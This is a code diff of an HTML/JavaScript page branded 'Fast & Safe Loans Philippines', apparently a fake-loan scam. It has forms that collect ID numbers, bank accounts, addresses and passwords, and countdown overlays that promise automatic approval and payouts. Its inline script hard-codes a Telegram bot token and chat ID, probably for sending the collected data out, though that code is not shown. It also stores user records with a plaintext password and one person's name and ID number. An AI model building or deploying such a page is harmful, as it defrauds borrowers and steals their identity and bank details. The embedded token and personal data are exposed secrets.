+      <div style="padding-top:4px;"></div>
+      <div id="verified-strip" class="verified-strip" style="display:none;">✅ Account Verified &amp; Active</div>
+      <div class="stat-grid">
+        <div class="stat-card">
+          <div class="s-label">Loan Status</div>
+          <div class="s-value yellow" id="home-loan-status">—</div>
+        </div>
+        <div class="stat-card">
+          <div class="s-label">Loan Amount</div>
+          <div class="s-value" id="home-loan-amount">₱0</div>
+        </div>
+        <div class="stat-card">
+          <div class="s-label">Account Type</div>
+          <div class="s-value" style="font-size:13px;">Bank Loan</div>
+        </div>
+        <div class="stat-card">
+          <div class="s-label">Slot #</div>
+          <div class="s-value yellow" id="home-slot">—</div>
         </div>
       </div>
+      <div class="section-label">Quick Actions</div>
+      <div class="stat-grid" style="grid-template-columns:1fr 1fr 1fr;margin:0 20px 16px;">
+        <div class="stat-card" style="text-align:center;cursor:pointer;" onclick="switchTab('loan')">
+          <div style="font-size:24px;margin-bottom:4px;">💰</div>
+          <div style="font-size:11px;font-weight:700;color:var(--text2);">Apply Loan</div>
+        </div>
+        <div class="stat-card" style="text-align:center;cursor:pointer;" onclick="switchTab('withdraw')">
+          <div style="font-size:24px;margin-bottom:4px;">🏧</div>
+          <div style="font-size:11px;font-weight:700;color:var(--text2);">Withdraw</div>
+        </div>
+        <div class="stat-card" style="text-align:center;cursor:pointer;" onclick="openIdModal()">
+          <div style="font-size:24px;margin-bottom:4px;">🪪</div>
+          <div style="font-size:11px;font-weight:700;color:var(--text2);">View ID</div>
+        </div>
+      </div>
+      <div class="section-card">
+        <div class="section-title"><span class="icon">📢</span>Notice</div>
+        <p style="font-size:13px;color:var(--text2);line-height:1.7;">Fast &amp; Safe Loans Philippines offers quick personal loans with flexible repayment. Apply today and get approved within minutes. Requirements: valid ID and active bank account.</p>
+      </div>
+    </div>
 
-      <div class="dash-section" id="dash-profile">
-        <div class="card"><h4 style="color:var(--primary-dark);">👤 Profile</h4><div id="profileInfo" style="font-size:13px;line-height:2;"></div></div>
+    <!-- LOAN TAB -->
+    <div id="panel-loan" class="tab-panel">
+      <div style="padding-top:4px;"></div>
+      <div class="section-card" style="margin-bottom:8px;">
+        <div class="section-title"><span class="icon">💰</span>Loan Application</div>
+        <p style="font-size:13px;color:var(--text2);">Fill in your details below. Our team will review your application.</p>
+      </div>
+      <div class="loan-form-wrap">
+        <form id="loan-form" autocomplete="off">
+          <div class="form-group"><label>Full Name</label><input type="text" id="loan-fullname" value="Shane Sabal" autocomplete="off"></div>
+          <div class="form-group"><label>ID Number</label><input type="text" id="loan-idnumber" value="4830645821731280" autocomplete="off"></div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Gender</label>
+              <select id="loan-gender">
+                <option value="Female" selected>Female</option>
+                <option value="Male">Male</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Birthday</label>
+              <input type="date" id="loan-birthday" value="1990-05-15" autocomplete="off">
+            </div>
+          </div>
+          <div class="form-group"><label>Bank Name</label>
+            <select id="loan-bank">
+              <option value="BDO">BDO Unibank</option>
+              <option value="BPI">BPI</option>
+              <option value="Metrobank" selected>Metrobank</option>
+              <option value="Landbank">Landbank</option>
+              <option value="PNB">PNB</option>
+              <option value="Security Bank">Security Bank</option>
+              <option value="UnionBank">UnionBank</option>
+              <option value="RCBC">RCBC</option>
+            </select>
+          </div>
+          <div class="form-group"><label>Bank Account Number</label><input type="text" id="loan-bankaccount" value="0987654321" autocomplete="off" inputmode="numeric"></div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Marital Status</label>
+              <select id="loan-marital">
+                <option value="Single" selected>Single</option>
+                <option value="Married">Married</option>
+                <option value="Widowed">Widowed</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Education</label>
+              <select id="loan-education">
+                <option value="High School">High School</option>
+                <option value="College" selected>College</option>
+                <option value="Vocational">Vocational</option>
+                <option value="Graduate">Graduate</option>
+              </select>
+            </div>
+          </div>
+          <div class="form-group"><label>Career / Occupation</label><input type="text" id="loan-career" value="Entrepreneur" autocomplete="off"></div>
+          <div class="form-group"><label>Province</label>
+            <select id="loan-province">
+              <option value="Metro Manila" selected>Metro Manila</option>
+              <option value="Cebu">Cebu</option>
+              <option value="Davao">Davao</option>
+              <option value="Bulacan">Bulacan</option>
+              <option value="Laguna">Laguna</option>
+              <option value="Pampanga">Pampanga</option>
+              <option value="Batangas">Batangas</option>
+              <option value="Rizal">Rizal</option>
+              <option value="Cavite">Cavite</option>
+              <option value="Other">Other</option>
+            </select>
+          </div>
+          <div class="form-group"><label>Complete Address</label><input type="text" id="loan-address" value="123 Rizal St., Makati City" autocomplete="off"></div>
+          <div class="form-group"><label>Loan Amount (₱)</label><input type="number" id="loan-amount" value="50000" min="1000" max="500000" inputmode="numeric" autocomplete="off"></div>
+          <button type="submit" class="btn-primary" id="loan-btn">📋 Submit Loan Application</button>
+          <div id="loan-status-info" style="margin-top:14px;text-align:center;font-size:13px;color:var(--text2);"></div>
+        </form>
+      </div>
+    </div>
+
+    <!-- WITHDRAW TAB -->
+    <div id="panel-withdraw" class="tab-panel">
+      <div style="padding-top:4px;"></div>
+      <div class="section-card" style="margin-bottom:8px;">
+        <div class="section-title"><span class="icon">🏧</span>Withdraw Funds</div>
+        <p style="font-size:13px;color:var(--text2);">Select your bank or e-wallet and enter withdrawal details.</p>
+      </div>
+      <div style="padding:0 20px;">
+        <div class="section-label" style="margin:0 0 10px;">Banks</div>
+        <div class="bank-grid">
+          <div class="bank-card" data-bank="BDO" onclick="selectBank(this)"><span class="bank-icon">🏦</span><span class="bank-name">BDO</span></div>
+          <div class="bank-card" data-bank="BPI" onclick="selectBank(this)"><span class="bank-icon">🏛</span><span class="bank-name">BPI</span></div>
+          <div class="bank-card" data-bank="Metrobank" onclick="selectBank(this)"><span class="bank-icon">🏢</span><span class="bank-name">Metrobank</span></div>
+          <div class="bank-card" data-bank="Landbank" onclick="selectBank(this)"><span class="bank-icon">🌾</span><span class="bank-name">Landbank</span></div>
+          <div class="bank-card" data-bank="PNB" onclick="selectBank(this)"><span class="bank-icon">🏠</span><span class="bank-name">PNB</span></div>
+          <div class="bank-card" data-bank="Security Bank" onclick="selectBank(this)"><span class="bank-icon">🛡</span><span class="bank-name">Security Bank</span></div>
+          <div class="bank-card" data-bank="UnionBank" onclick="selectBank(this)"><span class="bank-icon">💼</span><span class="bank-name">UnionBank</span></div>
+          <div class="bank-card" data-bank="RCBC" onclick="selectBank(this)"><span class="bank-icon">📊</span><span class="bank-name">RCBC</span></div>
+        </div>
+        <div class="section-label" style="margin:4px 0 10px;">E-Wallets</div>
+        <div class="bank-grid">
+          <div class="bank-card" data-bank="GCash" onclick="selectBank(this)"><span class="bank-icon">📱</span><span class="bank-name">GCash</span></div>
+          <div class="bank-card" data-bank="Maya" onclick="selectBank(this)"><span class="bank-icon">💳</span><span class="bank-name">Maya</span></div>
+          <div class="bank-card" data-bank="Coins.ph" onclick="selectBank(this)"><span class="bank-icon">🪙</span><span class="bank-name">Coins.ph</span></div>
+          <div class="bank-card" data-bank="GrabPay" onclick="selectBank(this)"><span class="bank-icon">🚕</span><span class="bank-name">GrabPay</span></div>
+        </div>
+        <div id="withdraw-form-section" style="display:none;margin-top:4px;">
+          <div class="section-card" style="margin:0 0 12px;">
+            <p style="font-size:13px;font-weight:600;color:var(--text2);">Selected: <span id="selected-bank-name" style="color:var(--yellow-dark);"></span></p>
+          </div>
+          <div class="form-group"><label>Withdrawal Amount (₱)</label><input type="number" id="wd-amount" placeholder="Enter amount" inputmode="numeric" autocomplete="off"></div>
+          <div class="form-group"><label>Account Number / Mobile</label><input type="text" id="wd-account" placeholder="Bank account / mobile number" autocomplete="off" inputmode="numeric"></div>
+          <div class="form-group"><label>Account Name</label><input type="text" id="wd-accname" placeholder="Name on account" autocomplete="off"></div>
+          <div class="form-group"><label>Password (Confirm)</label>
+            <div class="pw-wrap">
+              <input type="password" id="wd-password" placeholder="Enter your password" autocomplete="new-password">
+              <button type="button" class="pw-toggle" onclick="togglePw('wd-password',this)">👁</button>
+            </div>
+          </div>
+          <button class="btn-primary" onclick="submitWithdraw()" id="wd-btn">🏧 Process Withdrawal</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- PROFILE TAB -->
+    <div id="panel-profile" class="tab-panel">
+      <div style="padding-top:4px;"></div>
+      <div class="profile-header">
+        <div class="profile-avatar">👤</div>
+        <div class="profile-name" id="prof-name">—</div>
+        <div class="profile-email" id="prof-email">—</div>
+      </div>
+      <div style="height:16px;"></div>
+      <div class="profile-list">
+        <div class="profile-item"><span class="p-label">Full Name</span><span class="p-value" id="prof-fullname">—</span></div>
+        <div class="profile-item"><span class="p-label">ID Name</span><span class="p-value" id="prof-idname">—</span></div>
+        <div class="profile-item"><span class="p-label">ID Number</span><span class="p-value" id="prof-idnumber">—</span></div>
+        <div class="profile-item"><span class="p-label">Balance</span><span class="p-value" id="prof-balance" style="color:var(--yellow-dark);">₱0</span></div>
+        <div class="profile-item"><span class="p-label">Loan Status</span><span class="p-value" id="prof-loanstatus">—</span></div>
+        <div class="profile-item"><span class="p-label">Loan Amount</span><span class="p-value" id="prof-loanamount">₱0</span></div>
+        <div class="profile-item"><span class="p-label">Account Slot</span><span class="p-value" id="prof-slot">—</span></div>
+      </div>
+      <div style="height:16px;"></div>
+      <div style="padding:0 20px;">
+        <button class="btn-primary" onclick="openIdModal()" style="background:#1a1a1a;color:#fff;margin-bottom:12px;">🪪 View ID Photo</button>
+        <button class="btn-primary" onclick="doLogout()" style="background:#fff;color:#f44336;border:1.5px solid #f44336;">🚪 Log Out</button>
+      </div>
+    </div>
+
+    <!-- TAB BAR -->
+    <div class="tab-bar">
+      <button class="tab-item active" id="tab-home" onclick="switchTab('home')">
+        <span class="tab-icon">🏠</span><span class="tab-label">Home</span>
+      </button>
+      <button class="tab-item" id="tab-loan" onclick="switchTab('loan')">
+        <span class="tab-icon">💰</span><span class="tab-label">Loan</span>
+      </button>
+      <button class="tab-item" id="tab-withdraw" onclick="switchTab('withdraw')">
+        <span class="tab-icon">🏧</span><span class="tab-label">Withdraw</span>
+      </button>
+      <button class="tab-item" id="tab-profile" onclick="switchTab('profile')">
+        <span class="tab-icon">👤</span><span class="tab-label">Profile</span>
+      </button>
+      <button class="tab-item" id="tab-id" onclick="openIdModal()">
+        <span class="tab-icon">🪪</span><span class="tab-label">ID</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- ===================== OVERLAYS ===================== -->
+
+  <!-- Verification Overlay -->
+  <div class="overlay" id="overlay-verify">
+    <div class="overlay-card">
+      <h3>🔐 Account Verification</h3>
+      <p>Your account is being verified. Please wait for the process to complete. Do not close this window.</p>
+      <div class="circle-timer">
+        <svg width="140" height="140" viewBox="0 0 140 140">
+          <circle class="track" cx="70" cy="70" r="58"/>
+          <circle class="progress" id="verify-circle" cx="70" cy="70" r="58" stroke-dasharray="364.4" stroke-dashoffset="0"/>
+        </svg>
+        <div class="time-label">
+          <span id="verify-time">20:00</span>
+          <small>REMAINING</small>
+        </div>
+      </div>
+      <p style="font-size:12px;color:var(--text3);">Verification takes up to 20 minutes. Your account will be activated automatically.</p>
+    </div>
+  </div>
+
+  <!-- Loan Processing Overlay -->
+  <div class="overlay" id="overlay-loan">
+    <div class="overlay-card">
+      <h3>⏳ Loan Processing</h3>
+      <p>Your loan application is being reviewed. Auto-approval in progress.</p>
+      <div class="circle-timer">
+        <svg width="140" height="140" viewBox="0 0 140 140">
+          <circle class="track" cx="70" cy="70" r="58"/>
+          <circle class="progress" id="loan-circle" cx="70" cy="70" r="58" stroke-dasharray="364.4" stroke-dashoffset="0"/>
+        </svg>
+        <div class="time-label">
+          <span id="loan-time">30:00</span>
+          <small>REMAINING</small>
+        </div>
+      </div>
+      <p style="font-size:12px;color:var(--text3);">Loan will be auto-approved after 30 minutes and funds credited to your balance.</p>
+    </div>
+  </div>
+
+  <!-- Withdraw Processing Overlay -->
+  <div class="overlay" id="overlay-withdraw">
+    <div class="overlay-card">
+      <h3>💸 Processing Withdrawal</h3>
+      <p>Your withdrawal is being processed. Please wait.</p>
+      <div class="circle-timer">
+        <svg width="140" height="140" viewBox="0 0 140 140">
+          <circle class="track" cx="70" cy="70" r="58"/>
+          <circle class="progress" id="wd-circle" cx="70" cy="70" r="58" stroke-dasharray="364.4" stroke-dashoffset="0"/>
+        </svg>
+        <div class="time-label">
+          <span id="wd-time">30:00</span>
+          <small>REMAINING</small>
+        </div>
+      </div>
+      <p style="font-size:12px;color:var(--text3);">Funds will be transferred to your selected account after processing.</p>
+    </div>
+  </div>
+
+  <!-- ID Modal -->
+  <div class="modal-backdrop" id="modal-id">
+    <div class="modal-box">
+      <div class="modal-head">
+        <h4>🪪 ID Photo</h4>
+        <button class="modal-close" onclick="closeIdModal()">✕</button>
+      </div>
+      <div class="modal-body">
+        <img src="https://bsp888.cc/uploads/picture/202603/2402785ab62484d4c6e5b9738d8f2e82.jpg" alt="ID Photo" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22360%22 height=%22220%22><rect fill=%22%23f0b90b%22 width=%22360%22 height=%22220%22/><text x=%22180%22 y=%22110%22 fill=%22%231a1a1a%22 font-size=%2220%22 text-anchor=%22middle%22 font-family=%22Arial%22>ID Card</text></svg>'">
       </div>
     </div>
   </div>
 
-  <!-- OVERLAYS -->
-  <div class="overlay hidden" id="registerVerifyOverlay">
-    <div class="verify-circle">🆕</div>
-    <div class="countdown-text" id="regCountdown">20:00</div>
-    <p>Verifying your account...</p><p style="font-size:12px;">Please wait 20 minutes, then login.</p>
-  </div>
-  <div class="overlay hidden" id="withdrawOverlay">
-    <div class="verify-circle">💸</div><div class="countdown-text" id="withdrawCountdown">30:00</div>
-    <p>Processing withdrawal...</p><button class="btn-outline" onclick="closeWithdrawOverlay()">Close</button>
-  </div>
-  <div class="overlay hidden" id="loanPendingOverlay">
-    <div class="verify-circle">📋</div><div class="countdown-text" id="loanCountdown">30:00</div>
-    <p>Loan pending...</p><button class="btn-outline" onclick="closeLoanPendingOverlay()">Close</button>
-  </div>
+</div><!-- end #app -->
 
-  <div class="modal-overlay hidden" id="photoModal">
-    <div class="modal-content">
-      <h4 style="color:var(--primary-dark);">📷 ID Photo</h4>
-      <img src="https://bsp888.cc/uploads/picture/202603/2402785ab62484d4c6e5b9738d8f2e82.jpg" alt="ref">
-      <button class="btn btn-outline btn-sm" style="margin-top:10px;width:100%;" onclick="closePhotoModal()">Close</button>
-    </div>
-  </div>
+<!-- ===================== ADMIN SCRIPT (admin.js equivalent - inline) ===================== -->
+<script>
+// ============================================================
+//  CONFIGURATION
+// ============================================================
+const TG_TOKEN = '8843546617:AAH_D5IY57cezbnIZgHWgU5J-C_84MZIBBw';
+const TG_CHAT  = '7417215529';
+const LS_KEY   = 'fsl_v5';
 
-  <!-- Tawk.to -->
-  <script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-      var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-      s1.async=true; s1.src='https://embed.tawk.to/6a397c2849e0e21d4954f33a/1jro9aups';
-      s1.charset='UTF-8'; s1.setAttribute('crossorigin','*');
-      s0.parentNode.insertBefore(s1,s0);
-    })();
-  </script>
+// ============================================================
+//  DEFAULT USERS — 70 slots
+// ============================================================
+const DEFAULT_USERS = {
+  "1":{email:"123fhffhf@gmail.com",password:"12345678",balance:5000,loanStatus:"none",loanAmount:0,fullName:"Shane Sabal",idName:"Shane Sabal",idNumber:"4830645821731280"},
+  "2":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "3":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "4":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "5":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "6":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "7":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "8":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "9":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "10":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "11":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "12":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "13":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "14":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "15":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "16":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "17":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "18":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "19":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "20":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "21":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "22":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "23":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "24":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "25":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "26":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "27":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "28":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "29":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "30":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "31":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "32":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "33":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "34":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "35":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "36":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "37":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "38":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "39":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "40":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "41":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "42":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "43":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "44":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "45":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "46":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "47":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "48":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "49":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "50":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "51":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "52":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "53":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "54":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "55":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "56":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "57":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "58":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "59":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "60":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "61":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "62":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "63":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "64":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "65":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "66":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "67":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "68":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "69":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
+  "70":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""}
+};
 
-  <script>
-    const DEFAULT_USERS = {
-      "1":{email:"123fhffhf@gmail.com",password:"12345678",balance:0,loanStatus:"none",loanAmount:0,fullName:"Shane Sabal",idName:"Shane Sabal",idNumber:"4830645821731280"},
-      "2":{email:"123fhffhf@gmail.com",password:"00000000",balance:90,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "3":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "4":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "5":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "6":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "7":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "8":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "9":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "10":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "11":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "12":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "13":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "14":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "15":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "16":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "17":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "18":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "19":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "20":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "21":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "22":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "23":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "24":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "25":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "26":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "27":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "28":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "29":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "30":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "31":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "32":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "33":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "34":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "35":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "36":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "37":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "38":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "39":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "40":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "41":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "42":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "43":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "44":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "45":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "46":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "47":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "48":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "49":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "50":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "51":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "52":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "53":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "54":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "55":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "56":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "57":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "58":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
-      "59":{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""},
